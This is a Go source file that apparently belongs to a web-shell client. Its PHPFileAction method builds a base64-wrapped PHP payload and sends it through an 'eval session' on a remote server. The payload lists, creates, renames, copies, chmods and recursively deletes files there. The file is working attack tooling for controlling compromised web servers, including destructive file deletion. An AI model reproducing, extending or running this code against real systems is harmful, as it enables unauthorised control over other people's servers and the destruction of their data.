package session

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"time"
)

func (s *HTTPShell) PHPNative() bool { return s.lang == "php" && s.enc == nil }
func (s *HTTPShell) PHPFileAction(ctx context.Context, op, path, destination, mode string, recursive bool) (json.RawMessage, error) {
	if !s.PHPNative() {
		return nil, fmt.Errorf("native PHP file actions require a PHP eval session")
	}
	v := map[string]any{"op": op, "path": path, "destination": destination, "mode": mode, "recursive": recursive}
	b, _ := json.Marshal(v)
	source := `$a=json_decode(base64_decode('` + base64.StdEncoding.EncodeToString(b) + `'),true);$p=$a['path'];$ok=false;$result=null;
 switch($a['op']){
 case 'list':$result=array();$names=@scandir($p);if($names===false){throw new Exception('scandir failed');}foreach($names as $n){if($n==='.'||$n==='..'){continue;}$f=$p.DIRECTORY_SEPARATOR.$n;$result[]=array('name'=>$n,'is_dir'=>is_dir($f),'size'=>is_file($f)?filesize($f):0);} $ok=true;break;
 case 'mkdir':$ok=@mkdir($p,0755,false);break;
 case 'rename':$ok=@rename($p,$a['destination']);break;
 case 'copy':$ok=@copy($p,$a['destination']);break;
 case 'chmod':$ok=@chmod($p,octdec($a['mode']));break;
 case 'delete':if(is_dir($p)&&!is_link($p)){if($a['recursive']){$delete=function($d)use(&$delete){foreach(scandir($d) as $n){if($n==='.'||$n==='..'){continue;}$f=$d.DIRECTORY_SEPARATOR.$n;if(is_dir($f)&&!is_link($f)){$delete($f);}else{if(!unlink($f)){throw new Exception('unlink failed');}}}if(!rmdir($d)){throw new Exception('rmdir failed');}};$delete($p);$ok=true;}else{$ok=@rmdir($p);}}else{$ok=@unlink($p);}break;
 default:throw new Exception('unsupported file action');}
 if(!$ok){throw new Exception('file action failed');}echo json_encode(array('ok'=>true,'entries'=>$result));`
	out, err := s.Eval(ctx, source, 30*time.Second)
	if err != nil {
		return nil, err
	}
	var decoded map[string]any
	if json.Unmarshal([]byte(out), &decoded) != nil || decoded["ok"] != true {
		return nil, fmt.Errorf("invalid PHP file action result")
	}
	return json.RawMessage(out), nil
}
